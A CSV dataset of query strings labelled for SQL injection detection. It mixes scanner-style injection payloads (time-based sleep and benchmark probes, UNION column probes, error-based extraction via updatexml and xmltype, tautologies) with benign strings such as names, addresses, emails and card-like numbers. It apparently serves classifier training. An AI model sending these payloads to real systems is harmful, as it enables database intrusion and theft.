Query,Label
"1  )  )   )  and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
hanspete,0
"-5052  )  )   )  union all select 8351,8351,8351,8351#",1
1 and 2620 = 2175,1
 The Civil Aviation Safety Authority also said looking announcement emphasised restrictions use electronic devices critical phases flight still place Australia ,0
obermeie,0
80047732g,0
1'+ ( select 'jmdl' where 7827 = 7827,1
1 and 9122 = 4153# nxcv,1
lindon,0
" select * from users where id = 1 or "",."" or 1 = 1 -- 1",1
" select * from users where id = 1 or "" ( ["" or 1 = 1 -- 1",1
1%'  )  )   or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #,1
"1'+ ( select mcfb where 4050 = 4050 or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  )  +'",1
"1 )  as dqda where 1624 = 1624 and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
"1  )  )   )  and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( 4744 = 4744",1
1' where 6913 = 6913 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --,1
50561,0
"-6360' )  as yfrk where 3683 = 3683 union all select 3683,3683,3683,3683,3683,3683,3683,3683,3683#",1
dosrius,0
" I ought go upright vital, speak rude truth ways",0
3880,0
68364284g,0
x' and email is NULL; --,1
if ( 4194 = 4133 )  select 4194 else drop function tqhz--,1
"-7272"" )  union all select 9163,9163,9163,9163,9163,9163,9163--",1
"1%""  )  )   or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
1126,0
65927228m,0
"1%"" )  and 4595 = 4595#",1
" ( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and  ( ""vjlr"" like ""vjlr",1
villarramiel,0
tivissa,0
lisser-grebeshkova@hipermadrid.lv,0
"1'  )  )   as vqrt where 5173 = 5173 and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
2o0eri23,0
admin' or 1 = 1/*,1
48315,0
"c/ cartagena, 188,",0
"-3518 )  union all select 1877,1877,1877,1877#",1
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  (  'vjdk' like 'vjdk",1
"1' in boolean mode )  or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) #",1
"-2423'  )  )   )  union all select 8256,8256,8256,8256,8256,8256,8256,8256--",1
0891192306237140,0
" &quot; Finally , let &apos;s talk pumpkins ",0
"1""  )  )   as ydkd where 2455 = 2455 and sleep ( 5 ) --",1
"1%"" and make_set ( 2905 = 5725,5725 )  and ""%"" = """,1
valdovio,0
witting@videotubo.cl,0
1136300423547186,0
"1' )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and  ( 'lkun' like 'lkun",1
39392,0
fuentes de andaluca,0
97817650f,0
 Morris second-year student Harvard Medical School ,0
soffia,0
belinchn,0
mcginnis-dellagnese@storagecraft.na,0
" select * from users where id = 1 or 1#""? = 1 union select 1,version (  )  -- 1",1
patea64ra,0
1 )  where 6304 = 6304,1
pages@spainbb.kh,0
" In developments , Observatory &apos;s chief Rami Abdurrahman said strong explosion Wednesday inside air defense facility Syria &apos;s coastal province Latakia ",0
"1%""  )  )   )  or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"c/ pista, 101",0
12005174w,0
karelsen_cisar@seramitex.nu,0
14554532v,0
"1%""  )  )   union all select null--",1
26330,0
cecilia,0
" This time around , secretary Rolf Wagener delighted receive special &quot; Singer Year &quot; award ",0
49716,0
28850,0
1'  )  )   as wjfj where 3802 = 3802,1
6e933ci39lo,0
palau ustrell,0
lauro,0
"virgen del valsordo, 44, 3-a",0
6144372823408043,0
 They drove away ,0
"1%"" )  or elt ( 6272 = 6272,sleep ( 5  )  )   and  ( ""%"" = """,1
select pg_sleep ( 5 )  and   (  (  'vxxg' = 'vxxg,1
48999460f,0
"-6733' )  where 4024 = 4024 union all select 4024,4024,4024,4024#",1
"-2140  )  )   union all select 8174,8174,8174#",1
lapchak9,0
-1470'  )  )   )  or 9323 = 9323#,1
3099595340897586,0
"-6681"" )  or 5251 = 1162",1
espada stumptner,0
3880938788805170,0
93860343b,0
" The muscles, spontaneously moved, moved low usurping wilfulness, grow tight outline face disagreeable sensation",0
37120,0
 The experimental results show method achieve higher performance CRF-based baseline method,0
"1""  )  )   )  union all select null,null,null--",1
34468,0
belmondo@artesania.org.ci,0
"1' )  union all select null,null,null,null,null,null,null,null,null--",1
-7786'  )  )   or 9323 = 9323#,1
vilajosa larrumbe,0
"-2548""  )  )   )  or 5107 = 8049--",1
papageno,0
"-2364'+ ( select 'qdut' where 7560 = 7560 union all select 7560,7560,7560,7560,7560--",1
'sqlvuln,1
' or '' = ',1
-8045  )  )   )  order by 1--,1
 He said usually pope would name many cardinals needed raise number cardinal electors back 120 many cardinals aged 80 wanted ,0
-4057' )  order by 1#,1
08776,0
"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )  ",1
9322365663955939,0
"1"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and ""rdri"" = ""rdri",1
9554640279631297,0
leclerc,0
sumahya,0
quilln,0
1  )  )   as xyuy where 6894 = 6894,1
" select * from users where id = 1 or 1#"", = 1 or 1 = 1 -- 1",1
"1""  )  )   union all select null--",1
peri portaneri,0
1180317448071698,0
" The meeting point one half hour tour Nuclear Bunder Museum , 3: 00 p",0
8259767534834623,0
" select * from users where id = 1 or "". ) "" or 1 = 1 -- 1",1
"1"" where 3274 = 3274 or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",1
"1""  )  )   union all select null,null,null,null,null,null--",1
12205405h,0
kipnis,0
tienchie,0
munera,0
7537,0
6676519616771498,0
sevilla subauste,0
"1"" )  as axua where 6718 = 6718",1
" He also found guilty number terrorism-related charges , including wave bombings churches across Indonesia Christmas Eve 2000 ",0
0890605650691584,0
9019896710304929,0
9717,0
cgi 60 9bedb57073 heartbeat nav-menus false yetglezip 41 49 PRODUCT393 PRODUCT393 bbs1 1 view 115,0
17121,0
sternikova@clo2.mg,0
1'  )  )   or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and   (  (  'cqwz' like 'cqwz,1
"1'|| ( select 'rttq' from dual where 7368 = 7368 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666  )  )  ||'",1
melcocha,0
"-8923'+ ( select xgvz where 9858 = 9858 union all select 9858,9858,9858#",1
"1'  )  )   )  and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( 'msjw' like 'msjw",1
21 %,1
1087,0
9625616287143216,0
popoff,0
c/ san quintin 104 8-b,0
"isabel la catolica, 34",0
"1'+ ( select dklk where 9862 = 9862 union all select null,null,null,null,null,null--",1
"1"" )  where 5850 = 5850 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 ) --",1
"1"" )  as ubva where 6369 = 6369 and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"avenida blasco ibaez, s/n, 6?d",0
" Meanwhile , 35-year-old Sri Lankan asylum seeker died suspected heart attack arriving asylum boat Christmas Island week ",0
h78n7ce30,0
50259,0
"1'+ ( select iaeu where 5509 = 5509 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
inconstitucional,0
galatea,0
81403734h,0
37740,0
04888,0
"1, ( case when 5514 = 9602 then 1 else null end ) ",1
ratbodo,0
"-5840' )  or elt ( 1032 = 1032,3623 ) ",1
"1%' )  and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( '%' = '",1
r3ic5,0
-1468'  )  )   )  or 4875 = 6163#,1
1' and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) ,1
" &quot; In statement Thursday , representative Jagger , 70 , says &quot; categorically denies ever made pass Katy Perry ",0
 One man explained free hernia surgery &apos;d received allow work ,0
"1 or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  # jmki",1
"1""  )  )   )  and 5429 = 9596",1
7910538337072686,0
"1""  )  )   as turj where 1237 = 1237",1
" As recently last Tuesday , Nasdaq indices calculated one hour due data transfer errors ",0
"1""  )  )   as gawq where 4728 = 4728 or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
"1'  )  )   )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and   (  (   ( 'yqhk' = 'yqhk",1
delfa,0
 To great misunderstood,0
"1""  )  )   and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (  ""kpwc"" like ""kpwc",1
aljuba,0
" In methods, punctuation prediction treated separated post-procedure parsing, may suffer problem error propagation",0
"-9156'  )  )   union all select 9110,9110,9110,9110#",1
"-5904"" where 9782 = 9782 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",1
"joyosa, la",0
02327,0
82474321r,0
4203,0
"1'  )  )   or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (  'kmjn' = 'kmjn",1
select  ( case when  ( 1776 = 7688 )  then 1776 else 1/ ( select 0 )  end ) --,1
ella,0
camp fein,0
"-6534%'  )  )   or make_set ( 4107 = 9457,9457 )  and   (  (  '%' = '",1
1'|| ( select 'boxx' where 2038 = 2038 and 9198 = 9198--,1
"1' and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and 'kwhs' like 'kwhs",1
gualta,0
" and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,11 ...",1
1380667417846102,0
 It mainly chants away fans could heard ,0
94,0
 He suffered serious injuries taken &quot; Christophorus 6 &quot; rescue helicopter Salzburg Regional Hospital ,0
"urbanizacion barrio ledesma, 180,",0
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and   (  (   ( '%' = '",1
arnone,0
77077342h,0
zunuzi,0
09128,0
gilan@escarba.fk,0
1  )  )   )  and sleep ( 5 ) #,1
"1 )  as qzif where 7877 = 7877 union all select null,null,null,null,null,null,null--",1
7810892855835467,0
1'+ ( select 'gprq' where 8928 = 8928,1
5420336038280470,0
"1"" where 9173 = 9173 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )  --",1
"iif ( 2452 = 8999,1,1/0 ) ",1
"1"" where 2204 = 2204 and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --",1
1  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (   ( 4574 = 4574,1
" But also connectivity , across UK 18 cities including Glasgow Edinburgh better connected HS2 ",0
"-9934"" )  or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( ""xecb"" like ""xecb",1
97919020q,0
39426,0
"1%' )  and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and  ( '%' = '",1
bannerman@nevadahispanica.aq,0
1 )  where 2390 = 2390,1
"-3074'  )  )   union all select 6131,6131,6131,6131,6131,6131,6131--",1
sobermeja,0
select  ( case when  ( 8857 = 1512 )  then 8857 else 8857* ( select 8857 from mysql.db )  end ) #,1
"-6381%"" or 8571 = 8571--",1
1%' and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and '%' = ',1
"1"" )  and sleep ( 5 )  and  ( ""ytof"" = ""ytof",1
" select * from users where id = 1 or ""%["" or 1 = 1 -- 1",1
escriv,0
am6456ra,0
2488378329284954,0
1'+ ( select soqk where 5383 = 5383,1
"1' )  or elt ( 6272 = 6272,sleep ( 5  )  )   and  ( 'tmbs' = 'tmbs",1
" select * from users where id = 1 or $+<\ union select 1,@@VERSION -- 1",1
'+sqlvuln,1
 select * from users where id = 1 <@ or 1 = 1 -- 1,1
canfranc,0
" Whether producing soap , turning candles , felting making silk , suitable activity whatever age ",0
karels,0
04271,0
1' )  as ulbr where 7233 = 7233 and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --,1
1%'  )  )   order by 1#,1
16140,0
eleni,0
-2707'  )  )   )  or  ( 8459 = 8459 ) *4906 and   (  (   ( 'mwdq' = 'mwdq,1
8486012682683585,0
kirkley9,0
-9739' or 8571 = 8571--,1
"1"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  ",1
"1  )  )   union all select null,null#",1
" , 1: 00 p",0
"-6363"" )  where 4043 = 4043 union all select 4043,4043,4043,4043,4043,4043,4043,4043,4043--",1
1 ) ,1
"1'|| ( select 'hvqw' from dual where 4423 = 4423 union all select null,null,null--",1
"-1244 )  as qszw where 2332 = 2332 union all select 2332,2332,2332,2332#",1
02838,0
"1', ( select  ( case when  ( 9443 = 9443 )  then sleep ( 5 )  else 9443* ( select 9443 from information_schema.character_sets )  end  )  )  ",1
mompel urdi,0
fidelio 5,0
alvis,0
requilorio,0
 Users Twitter published photos SWAT officer weapon lying ground ,0
"1' )  where 4092 = 4092 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
 Wonks call mileage-based user fee ,0
 Gönningen found extremely difficult cope hard well-positioned offensive moves ,0
" Jack Drescher , specializes issues gender identification , said new German law &quot; sounds like good thing ",0
"-1949""  )  )   as urke where 8761 = 8761 union all select 8761,8761,8761,8761,8761,8761,8761#",1
82634246f,0
"-8301' )  union all select 1806,1806--",1
vil francino,0
1%'  )  )   order by 1--,1
"1%""  )  )   and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (  ""%"" = """,1
"waitfor delay '0:0:5' and  ( ""ludp"" like ""ludp",1
 Two models proposed cause punctuation prediction interact transition actions parsing,0
"1"" )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and  ( ""jfgk"" like ""jfgk",1
"1%""  )  )   or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (  ""%"" = """,1
1818801431707826,0
teulinks-oakman@941.tr,0
 Only post boxes front post office building Ernst-Ludwig-Straße 36 Jakob-Müller-Straße 1 Hüttenfeld still emptied ,0
"1"" where 5216 = 5216 or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
8889874100386477,0
90907663w,0
+delaxar,0
avinguda mas fuster 175 8b,0
"1%""  )  )   )  union all select null,null,null,null#",1
select case when 2930 = 7964 then 1 else null end--,1
 But went way beyond ordinary confines lawyer-client relationship ,0
"1'  )  )   as qhpv where 7049 = 7049 and make_set ( 8403 = 8403,8899 ) --",1
pladellorens albiana,0
"1""  )  )   and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (  ""rqxd"" = ""rqxd",1
"1 and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) # hlrg",1
" Early puberty: Growing older sooner African-American Hispanic girls tend reach puberty earlier white counterparts , research shows ",0
" &quot; In statement announcing news , Father Federico Lombardi , Vatican spokesman , said meeting existing cardinals would held ceremony elevate new cardinals , known consistory ",0
"1'|| ( select 'mgel' where 3591 = 3591 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )    )  )  ||'",1
pauli,0
1'|| ( select 'eyiy' from dual where 8127 = 8127,1
 The accused initially remained silent ,0
calamocha,0
2680573956820155,0
4872,0
1914,0
8355546144248132,0
mu9d6c09,0
" select * from users where id = 1 or \<\ union select null,@@VERSION -- 1",1
 Pangerl sped finish line first place ,0
19416147f,0
1  )  )   rlike sleep ( 5 ) #,1
"c/ reval s/n, 13-h",0
"1', ( case when 5204 = 2136 then 1 else null end ) ",1
5377372403667671,0
17707,0
"1'  )  )   as lizu where 7691 = 7691 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
17132,0
 or 3 = 3,1
arpad4@emepleo.lr,0
orourke7@stockdefotos.lk,0
9589985001483437,0
" For 21 years , Georges Bwelle watched ill father slip consciousness , traveling hospitals &apos;t equipped help ",0
patatera,0
calle castaos 90,0
"9 billion candy , costumes decorations , according National Retail Federation ",0
34305,0
95328463h,0
"-4586' )  as shdb where 6176 = 6176 union all select 6176,6176,6176,6176#",1
admin'or 1 = 1 or '' = ',1
"-5054%""  )  )   )  union all select 8263,8263,8263,8263--",1
a0r4g7,0
7974,0
 Nor anyone point EU member states spend much time bending formal rules suits ,0
27415264t,0
 select sleep ( 5 ) -- hlgt,1
06928,0
1 )  and  ( 3020 = 3020 ) *6703,1
2678503703599908,0
"1"" where 3247 = 3247 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
 &quot; The Times obtained copy forthcoming book reported Thursday evening President &apos;s top aides conducted &quot; extensive group-sessions polling late 2011 &quot; gauge whether dumping Biden could help bolster Obama &apos;s waning re-election hopes ,0
85063049x,0
4780011651843487,0
select sleep ( 5  )  )  +',1
scanlon@theroxyblue.ng,0
9047664799943774,0
" Barbar Ritter , Chair Committee Schutterwald-Neuried pastoral care unit , practical experience joint committee five parishes ",0
89910635r,0
"playa postiguet 81,",0
" He wrote &apos; Theology Computer &apos; questioned separates humans machine , creator creation ",0
adulatorio,0
"1' )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and  ( 'cfzp' like 'cfzp",1
" The group -- mix Cameroonian doctors foreign medical students -- performed 700 free surgeries past year , know help make world difference help ",0
"1%"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and ""%"" = """,1
02933716c,0
8732,0
" select * from users where id = 1 or @<@ = 1 union select 1,version (  )  -- 1",1
pl. guerrero strachan s/n 4-a,0
"1'  )  )   as arhm where 3268 = 3268 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",1
i02tent0,0
01139,0
branchadell arribas,0
"1""  )  )   as jikg where 8258 = 8258 and  ( 3973 = 1047 ) *1047--",1
"1"" where 2483 = 2483",1
9184060552279623,0
"1"" where 9230 = 9230",1
5071457093229658,0
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( ""unju"" = ""unju",1
12185,0
"1"" where 1115 = 1115 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
-5268' )  where 5615 = 5615 or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --,1
"repeso 27,",0
"1%"" or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
noris,0
"1""  )  )   )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (   ( ""hiwo"" like ""hiwo",1
8703807831121479,0
hounsell,0
" Derided Brotherhood &apos;s uncharismatic &quot; spare tyre , &quot; personal prestige surged since victory delivery Friday speech tried present candidate Islamists want complete work 2011 uprising authoritarian Mubarak ",0
1%' and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and '%' = ',1
1'+ ( select 'jkgf' where 7487 = 7487,1
"c/ bernat y baldovi, 32 6-g",0
"1' )  and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( 'ndhn' like 'ndhn",1
 Killing ,0
 It also shows business expects renegotiation make significant shift current balance power back towards UK ,0
" Already , Australia Nepal allow adults mark male , female &quot; third gender &quot; official documents ",0
"1"" and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ",1
"1 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) # rhli",1
5537760506536596,0
"1"" )  union all select null,null--",1
"-2418'|| ( select 'mdbt' from dual where 3026 = 3026 union all select 3026,3026,3026,3026,3026,3026,3026,3026,3026--",1
asshole,0
alisik-koller@coreserv.zm,0
jamal,0
trikonis_ruschel@beatrizbalado.zw,0
" If malice vanity wear coat philanthropy, shall pass? If angry bigot assumes bountiful cause Abolition, comes last news Barbadoes, I say him, ‘Go love thy infant; love thy wood-chopper: good-natured modest: grace; never varnish hard, uncharitable ambition incredible tenderness black folk thousand miles off",0
carmnea,0
brock,0
1 where 2301 = 2301,1
0466431001368094,0
0332806980099354,0
 select * from users where id = 1 or  ( \+ )  = 1 or 1 = 1 -- 1,1
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null  )  )  ||'",1
waitfor delay '0:0:5' and  ( 'yauq' = 'yauq,1
"-5630"" )  or 3038 = 3038",1
1'|| ( select 'owzs' where 1475 = 1475 union all select null--,1
"1' where 8969 = 8969 union all select null,null,null,null,null--",1
" I shun father mother wife brother, genius calls me",0
95531349k,0
"com"" style = ""max-width:450px;float:left;padding:10px 10px 10px 0px;border:0px;""> As type buying selling turn 2145 215 22 220 540 543 544473 buy omnicef diners club store 544473""> buy omnicef diners club store </a>  544473""]buy omnicef diners club store[/url] 9ArATgxuN99s5bw1e@V$K@JrLjlTnn1aFZqEw2cH@V$K@1d2RRER7vmuzdd4nPCz@V$K@/CkclyEqatPpZvNr  </methodCall>   </methodCall> 482  </params>   <?xml version = ""1",0
 They measured pets &apos; heart rates analysed behaviour ,0
1391785599222987,0
correas azeas,0
 Tamar-Mattis said organization supports Australian law &quot; allows adults choose recognized third gender ,0
pa,0
"1' )  where 3579 = 3579  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users ) --",1
1'|| ( select 'lmsc' from dual where 1162 = 1162 order by 1--,1
"-1710""  )  )   as cvky where 1858 = 1858 union all select 1858,1858--",1
1 )  as gfhf where 5804 = 5804 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  --,1
6429,0
 Among pressing relaxation restrictions passengers &apos; use devices Amazon,0
 He took oath court &apos;s 18 black-robed judges Nile-side seat built resemble ancient Egyptian temple ,0
"-7008'  )  )   union all select 9080,9080,9080#",1
cossio obrist,0
 Even close allies keep things one another - work every angle find &apos;s held back ,0
" Options include upgraded brakes , service package providing access Bowler Works mechanics , logistic support , vehicle storage events ",0
" select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1",1
 The administration said come surprise 5 percent population purchase insurance may forced switch plans coverage &apos;t meet new standards required Affordable Care Act ,0
4476727258540536,0
bnrlsi,0
knorp5,0
forst,0
"1%"" )  union all select null,null,null,null,null,null,null,null,null#",1
 But know difficult Stuttgart ,0
" For medical nursing students O &apos;Malley , come United States Europe join Bwelle missions , &apos;s hands-on opportunity &apos;d never get home ",0
